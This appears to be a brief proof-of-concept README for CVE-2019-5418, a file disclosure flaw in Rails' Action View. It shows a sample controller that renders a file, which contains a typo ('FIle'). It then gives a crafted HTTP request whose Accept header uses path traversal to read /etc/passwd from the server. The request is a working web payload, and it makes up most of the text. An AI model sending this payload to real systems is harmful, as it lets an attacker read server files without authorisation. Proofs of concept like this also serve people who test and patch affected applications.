# CVE-2019-5418

File content disclosure in Action View library

This is a prove of concept.

With specially crafted HTTP Request possible to render any local file.

Vulnerable code
```
class WelcomeController < ApplicationController

  def text
    render file: FIle.join(Rails.root, 'some_file')
  end

end
```
Make request:

```
GET /welcome/text HTTP/1.1

Host: localhost:3000

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0

Accept: ../../../../../../../../../../../etc/passwd{{

Accept-Language: en-GB,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close
Cookie: _implicit_render_session=QUlyNmo3MnFWZVdVMFpZQTBYSU5NSFNqRUFCMGhkRTg3dWFobmRwM2NKQnNoR2lQYXBLZ1ZySXlQZ0IybG1SaE0xZUl2Y2pIZ2RMc3QwaWZMY3QrSjZqNnVSRXlpakxKU1REM1oyREpHMUh0TzVwUUJQMEhwSlJSSEg2WmZLcmhiL0dYTXowdWErcno5aHVBSGxBRkZBPT0tLTZjWmRVbEhDN3hwZldwTFBlakZMdUE9PQ%3D%3D--965383b4bcd1b71ddaaa95f626c3bc0492a0e5aa
Upgrade-Insecure-Requests: 1
```
